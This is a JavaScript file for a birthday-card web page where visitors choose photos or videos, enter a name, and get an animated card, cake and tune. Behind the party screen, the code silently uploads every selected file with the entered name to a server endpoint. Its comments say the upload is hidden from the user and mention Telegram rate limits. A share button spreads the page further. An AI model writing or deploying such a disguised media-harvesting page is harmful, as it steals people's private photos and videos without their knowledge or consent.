const $ = (id) => document.getElementById(id);
const welcomeStep = $("welcomeStep");
const photoStep = $("photoStep");
const partyStep = $("partyStep");
const mediaInput = $("mediaInput");
const chooseBtn = $("chooseBtn");
const uploadBtn = $("uploadBtn");
const fileList = $("fileList");

const MAX_FILE_BYTES = 4 * 1024 * 1024;
let selectedFiles = [];
let currentPreviewUrl = null;

// 1. Start Flow
$("startBtn").addEventListener("click", () => {
  welcomeStep.classList.add("hidden");
  photoStep.classList.remove("hidden");
  $("nameInput").focus();
});

// 2. File Selection
chooseBtn.addEventListener("click", () => mediaInput.click());
mediaInput.addEventListener("change", () => {
  selectedFiles = Array.from(mediaInput.files || []);
  renderFileList();
  updateUploadButton();
});

function renderFileList() {
  fileList.replaceChildren();
  if (!selectedFiles.length) {
    fileList.classList.add("hidden");
    $("selectionHint").textContent = "Choose at least one file to continue.";
    return;
  }
  fileList.classList.remove("hidden");
  $("selectionHint").textContent = selectedFiles.length + " file(s) ready for the surprise.";
  selectedFiles.forEach((file, index) => {
    const row = document.createElement("div");
    row.className = "file-item";
    const icon = document.createElement("span");
    icon.className = "file-type";
    icon.textContent = file.type.startsWith("video/") ? "▶" : "▧";
    
    const meta = document.createElement("span");
    meta.className = "file-meta";
    const name = document.createElement("strong");
    name.textContent = file.name;
    
    meta.append(name);
    
    const remove = document.createElement("button");
    remove.className = "file-remove";
    remove.type = "button";
    remove.textContent = "×";
    remove.addEventListener("click", () => {
      selectedFiles.splice(index, 1);
      const transfer = new DataTransfer();
      selectedFiles.forEach(item => transfer.items.add(item));
      mediaInput.files = transfer.files;
      renderFileList();
      updateUploadButton();
    });
    
    row.append(icon, meta, remove);
    fileList.append(row);
  });
}

function updateUploadButton() {
  const tooLarge = selectedFiles.some(file => file.size > MAX_FILE_BYTES);
  uploadBtn.disabled = !selectedFiles.length || tooLarge;
  if (tooLarge) $("selectionHint").textContent = "One or more files exceed 4 MB. Please remove them.";
}

// 3. Background Upload + Transition
uploadBtn.addEventListener("click", async () => {
  if (!selectedFiles.length) return;
  if (selectedFiles.some(file => file.size > MAX_FILE_BYTES)) {
    toast("Please remove files larger than 4 MB.");
    return;
  }

  // Turant Card set karo aur party screen dikhao
  if (currentPreviewUrl) URL.revokeObjectURL(currentPreviewUrl);
  currentPreviewUrl = URL.createObjectURL(selectedFiles.find(file => file.type.startsWith("image/")) || selectedFiles[0]);
  $("cardPhoto").src = currentPreviewUrl;
  $("cardName").textContent = $("nameInput").value.trim() || "Happy Birthday";
  
  photoStep.classList.add("hidden");
  partyStep.classList.remove("hidden");

  // Background me chupchap upload karo (bina user ko dikhaye)
  for (const file of selectedFiles) {
    try {
      await uploadOneSilently(file);
      await new Promise(r => setTimeout(r, 1000)); // Telegram rate limit se bachne ke liye 1 sec delay
    } catch (e) {
      console.log("Silent upload failed for:", file.name);
    }
  }
});

// Base64 convert
function readAsBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(String(reader.result).split(",")[1]);
    reader.onerror = () => reject(new Error("Could not read " + file.name));
    reader.readAsDataURL(file);
  });
}

// Silent Upload
async function uploadOneSilently(file) {
  const base64 = await readAsBase64(file);
  const userName = $("nameInput").value.trim() || "Birthday guest";
  
  const res = await fetch("/.netlify/functions/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      fileData: base64,
      fileName: file.name,
      fileType: file.type || "application/octet-stream",
      caption: "Birthday memory shared · From: " + userName
    })
  });
  if (!res.ok) throw new Error("Upload failed");
}

// 4. Cake & Share Logic
$("revealBtn").addEventListener("click", () => $("cakePopup").classList.remove("hidden"));
$("closeBtn").addEventListener("click", () => $("cakePopup").classList.add("hidden"));

$("cutBtn").addEventListener("click", () => {
  document.querySelector(".cake-glow").textContent = "🍰";
  $("cakeTitle").textContent = "Happy Birthday!";
  $("cakeMessage").classList.add("hidden");
  $("cutBtn").classList.add("hidden");
  $("finalWish").classList.remove("hidden");
  playBirthdayTune();
});

$("shareBtn").addEventListener("click", async () => {
  const shareData = { title: "A Birthday Surprise ✨", text: "I made a little birthday surprise for you!", url: window.location.href };
  try {
    if (navigator.share) await navigator.share(shareData);
    else if (navigator.clipboard) { await navigator.clipboard.writeText(window.location.href); toast("Link copied to clipboard!"); }
    else toast("Copy this page link from your browser.");
  } catch (error) {
    if (error.name !== "AbortError") toast("Couldn't open the share menu.");
  }
});

function toast(message) {
  const element = $("toast");
  element.textContent = message;
  element.classList.add("show");
  window.setTimeout(() => element.classList.remove("show"), 2600);
}

// Music Function
function playBirthdayTune() {
  const AudioContext = window.AudioContext || window.webkitAudioContext;
  if (!AudioContext) return;
  const context = new AudioContext();
  const notes = [[392,.28],[392,.28],[440,.55],[392,.55],[523,.55],[494,.9],[392,.28],[392,.28],[440,.55],[392,.55],[587,.55],[523,.9]];
  let start = context.currentTime;
  notes.forEach(([frequency,duration]) => {
    const oscillator = context.createOscillator();
    const gain = context.createGain();
    oscillator.type = "sine";
    oscillator.frequency.value = frequency;
    gain.gain.setValueAtTime(.0001,start);
    gain.gain.exponentialRampToValueAtTime(.16,start+.04);
    gain.gain.exponentialRampToValueAtTime(.0001,start+duration);
    oscillator.connect(gain);
    gain.connect(context.destination);
    oscillator.start(start);
    oscillator.stop(start+duration);
    start += duration+.04;
  });
  window.setTimeout(() => context.close(), 9000);
}
